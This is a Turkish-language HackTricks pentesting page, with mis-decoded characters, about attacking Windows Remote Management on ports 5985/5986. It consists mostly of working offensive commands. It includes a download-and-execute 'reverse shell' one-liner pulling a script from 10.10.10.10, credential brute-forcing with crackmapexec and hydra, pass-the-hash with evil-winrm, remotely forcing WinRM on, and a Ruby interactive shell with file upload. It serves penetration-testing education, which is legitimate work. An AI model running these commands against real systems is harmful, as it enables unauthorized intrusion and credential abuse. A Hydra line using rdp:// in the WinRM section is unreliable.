# 5985,5986 - WinRM Pentesting

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek katkÄ±da bulunun.

</details>

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hackleme Ä°Ã§gÃ¶rÃ¼leri**\
Hackleme heyecanÄ±nÄ± ve zorluklarÄ±nÄ± ele alan iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hackleme dÃ¼nyasÄ±nda gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle gÃ¼ncel kalÄ±n

**En Son Duyurular**\
BaÅŸlatÄ±lan en yeni Ã¶dÃ¼l avÄ± programlarÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!

## WinRM

[Windows Uzak YÃ¶netimi (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx), HTTP(S) Ã¼zerinden Windows sistemlerinin uzaktan yÃ¶netimini saÄŸlayan **Microsoft tarafÄ±ndan geliÅŸtirilen bir protokol** olarak Ã¶ne Ã§Ä±kÄ±yor ve bu sÃ¼reÃ§te SOAP'Ä± kullanÄ±yor. Temelde WMI tarafÄ±ndan desteklenen WinRM, WMI iÅŸlemleri iÃ§in HTTP tabanlÄ± bir arayÃ¼z olarak kendini sunar.

Bir makinede WinRM'nin bulunmasÄ±, SSH'nin diÄŸer iÅŸletim sistemleri iÃ§in nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±na benzer ÅŸekilde PowerShell aracÄ±lÄ±ÄŸÄ±yla kolay uzaktan yÃ¶netimi saÄŸlar. WinRM'nin etkin olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in belirli portlarÄ±n aÃ§Ä±lÄ±p aÃ§Ä±lmadÄ±ÄŸÄ±nÄ±n kontrol edilmesi Ã¶nerilir:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

YukarÄ±daki listeden bir aÃ§Ä±k port, WinRM'nin kurulduÄŸunu ve dolayÄ±sÄ±yla uzaktan oturum baÅŸlatma giriÅŸimlerine izin verildiÄŸini gÃ¶sterir.

### **WinRM Oturumu BaÅŸlatma**

PowerShell'i WinRM iÃ§in yapÄ±landÄ±rmak iÃ§in Microsoft'un `Enable-PSRemoting` komut dosyasÄ± devreye girer ve bilgisayarÄ±n uzaktan PowerShell komutlarÄ±nÄ± kabul etmesini saÄŸlar. YÃ¼kseltilmiÅŸ PowerShell eriÅŸimi ile, aÅŸaÄŸÄ±daki komutlar bu iÅŸlevselliÄŸi etkinleÅŸtirmek ve herhangi bir ana bilgisayarÄ± gÃ¼venilir olarak belirlemek iÃ§in Ã§alÄ±ÅŸtÄ±rÄ±labilir.
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Bu yaklaÅŸÄ±m, `trustedhosts` yapÄ±landÄ±rmasÄ±na bir joker karakter eklemeyi iÃ§erir, bu adÄ±m sonuÃ§larÄ± nedeniyle dikkatli bir ÅŸekilde dÃ¼ÅŸÃ¼nÃ¼lmesi gereken bir adÄ±mdÄ±r. AyrÄ±ca, saldÄ±rganÄ±n makinesinde aÄŸ tÃ¼rÃ¼nÃ¼ "Genel"den "Ä°ÅŸ"e deÄŸiÅŸtirmenin gerekebileceÄŸi belirtilmektedir.

AyrÄ±ca, WinRM, aÅŸaÄŸÄ±daki gibi gÃ¶sterildiÄŸi gibi `wmic` komutunu kullanarak **uzaktan etkinleÅŸtirilebilir**:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Bu yÃ¶ntem, WinRM'nin uzaktan kurulumuna olanak tanÄ±r, Windows makinelerini uzaktan yÃ¶netme esnekliÄŸini artÄ±rÄ±r.

### YapÄ±landÄ±rÄ±ldÄ± mÄ± diye test edin

SaldÄ±rÄ± makinenizin yapÄ±landÄ±rmasÄ±nÄ± doÄŸrulamak iÃ§in `Test-WSMan` komutu kullanÄ±lÄ±r ve hedefin WinRM'nin doÄŸru ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in kullanÄ±lÄ±r. Bu komutu Ã§alÄ±ÅŸtÄ±rarak, protokol sÃ¼rÃ¼mÃ¼ ve wsmid ile ilgili ayrÄ±ntÄ±lar almayÄ± beklemelisiniz, baÅŸarÄ±lÄ± yapÄ±landÄ±rmayÄ± gÃ¶sterir. AÅŸaÄŸÄ±da, yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir hedef iÃ§in beklenen Ã§Ä±ktÄ±yÄ± gÃ¶steren Ã¶rnekler ile yapÄ±landÄ±rÄ±lmamÄ±ÅŸ bir hedef iÃ§in Ã¶rnekler bulunmaktadÄ±r:

* **DoÄŸru ÅŸekilde** yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir hedef iÃ§in Ã§Ä±ktÄ± ÅŸuna benzer olacaktÄ±r:
```bash
Test-WSMan <target-ip>
```
### Bir komutu Ã§alÄ±ÅŸtÄ±r

Uzaktaki bir makinede `ipconfig` komutunu Ã§alÄ±ÅŸtÄ±rmak ve Ã§Ä±ktÄ±sÄ±nÄ± gÃ¶rÃ¼ntÃ¼lemek iÃ§in ÅŸunu yapÄ±n:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (151).png>)

AyrÄ±ca, mevcut PS konsolunuzda bir komutu **Invoke-Command** aracÄ±lÄ±ÄŸÄ±yla Ã§alÄ±ÅŸtÄ±rabilirsiniz. Diyelim ki yerel olarak _enumeration_ adÄ±nda bir fonksiyonunuz var ve bunu uzak bir bilgisayarda Ã§alÄ±ÅŸtÄ±rmak istiyorsunuz, ÅŸunu yapabilirsiniz:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Bir Komut DosyasÄ± Ã‡alÄ±ÅŸtÄ±rma
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Ters kabuk almak
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Bir PS oturumu alÄ±n

EtkileÅŸimli bir PowerShell kabuÄŸu almak iÃ§in `Enter-PSSession` komutunu kullanÄ±n:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (1009).png>)

**Oturum, "kurban" iÃ§inde yeni bir iÅŸlemde (wsmprovhost) Ã§alÄ±ÅŸacaktÄ±r.**

### **WinRM'yi AÃ§maya Zorlama**

PS Remoting ve WinRM kullanmak iÃ§in bilgisayar yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, ÅŸunlarÄ± kullanarak etkinleÅŸtirebilirsiniz:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### OturumlarÄ± Kaydetme ve Geri YÃ¼kleme

Bu, uzak bilgisayarda dil kÄ±sÄ±tlandÄ±ÄŸÄ±nda **Ã§alÄ±ÅŸmayacaktÄ±r**.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Bu oturumlar iÃ§inde _Invoke-Command_ kullanarak PS betiklerini yÃ¼kleyebilirsiniz.
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Hatalar

EÄŸer aÅŸaÄŸÄ±daki hatayÄ± bulursanÄ±z:

`enter-pssession : Uzak sunucuya 10.10.10.175 baÄŸlanma iÅŸlemi aÅŸaÄŸÄ±daki hata ile baÅŸarÄ±sÄ±z oldu: WinRM istemcisi isteÄŸi iÅŸleyemez. EÄŸer kimlik doÄŸrulama ÅŸemasÄ± Kerberos'tan farklÄ±ysa veya istemci bilgisayarÄ± bir etki alanÄ±na katÄ±lmamÄ±ÅŸsa, o zaman HTTPS iletiÅŸim taÅŸÄ±masÄ± kullanÄ±lmalÄ± veya hedef makine GÃ¼venilirAnaBilgisayarlar yapÄ±landÄ±rma ayarÄ±na eklenmelidir. GÃ¼venilirAnaBilgisayarlar yapÄ±landÄ±rmasÄ± iÃ§in winrm.cmd kullanÄ±n. GÃ¼venilirAnaBilgisayarlar listesindeki bilgisayarlarÄ±n kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ olabileceÄŸini unutmayÄ±n. Bu konu hakkÄ±nda daha fazla bilgi almak iÃ§in aÅŸaÄŸÄ±daki komutu Ã§alÄ±ÅŸtÄ±rarak winrm yardÄ±m yapÄ±landÄ±r komutunu kullanÄ±n: winrm help config. Daha fazla bilgi iÃ§in about_Remote_Troubleshooting YardÄ±m konusuna bakÄ±n.`

MÃ¼ÅŸteri tarafÄ±nda deneyin (bilgi [buradan](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n, deneyimli hackerlar ve hata Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurun!

**Hacking Insights**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± ele alan iÃ§eriklerle etkileÅŸime geÃ§in

**Real-Time Hack News**\
HÄ±zla deÄŸiÅŸen hacking dÃ¼nyasÄ±nda gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle gÃ¼ncel kalÄ±n

**Latest Announcements**\
YayÄ±nlanan en yeni hata Ã¶dÃ¼llerini ve Ã¶nemli platform gÃ¼ncellemelerini takip edin

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!

## Linux'ta WinRM baÄŸlantÄ±sÄ±

### Brute Force

Dikkatli olun, winrm brute-force saldÄ±rÄ±larÄ± kullanÄ±cÄ±larÄ± engelleyebilir.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### KÃ¶tÃ¼cÃ¼l-winrm KullanÄ±mÄ±
```ruby
gem install evil-winrm
```
Oku **belgelendirme** onun github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Evil-winrm'Ä± kullanarak bir **IPv6 adresine** baÄŸlanmak iÃ§in, bir **alan adÄ±nÄ±** IPv6 adresine ayarlayarak _**/etc/hosts**_ iÃ§inde bir giriÅŸ oluÅŸturun ve o alan adÄ±na baÄŸlanÄ±n.

### Evil-winrm ile hash geÃ§irme
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (680).png>)

### Bir PS-docker makinesi kullanma
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Bir ruby betiÄŸi kullanma

**Kod buradan alÄ±nmÄ±ÅŸtÄ±r:** [**https://alamot.github.io/winrm\_shell/**](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## Referanslar

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Otomatik KomutlarÄ±
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
â€‹

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n ve deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurun!

**Hacking Insights**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± ele alan iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avÄ± baÅŸlatmalarÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi edinin

**Bize KatÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
